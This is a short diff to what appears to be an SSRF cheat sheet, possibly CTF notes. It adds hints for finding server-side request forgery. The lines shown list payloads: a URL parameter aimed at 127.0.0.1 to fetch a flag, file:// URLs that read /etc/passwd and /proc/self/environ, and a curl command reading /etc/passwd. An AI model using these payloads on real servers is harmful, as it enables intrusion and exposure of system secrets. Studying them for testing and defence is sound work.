@@ -286,8 +286,10 @@ Note:
 Summary: Attacker can make requests from a server to target a system's internals (i.e intranet) by bypassing its firewalls.
 
 SSRF indicators:
-* Network requests that may reference a localhost address: `https://ns.agency/static?r=http://127.0.0.1:[port]/flag.html` (inspect->network)
-* Callback functions
+* Look for network requests that may reference a localhost address: `https://ns.agency/static?r=http://127.0.0.1:[port]/flag.html` (inspect->network)
+* Callback functions.
+* Look for params that may reference internal services.
+* Look for a search input box / any form input that may reference internal services.
 
 File Protocol:
 ```
@@ -295,7 +297,7 @@ file:///etc/passwd
 file:///proc/self/cmdline
 file:///proc/self/exe
 file:///proc/self/environ
-curl file://google.com/etc/passwd
+curl file:///etc/passwd
 ```
 
 Gopher Protocol:
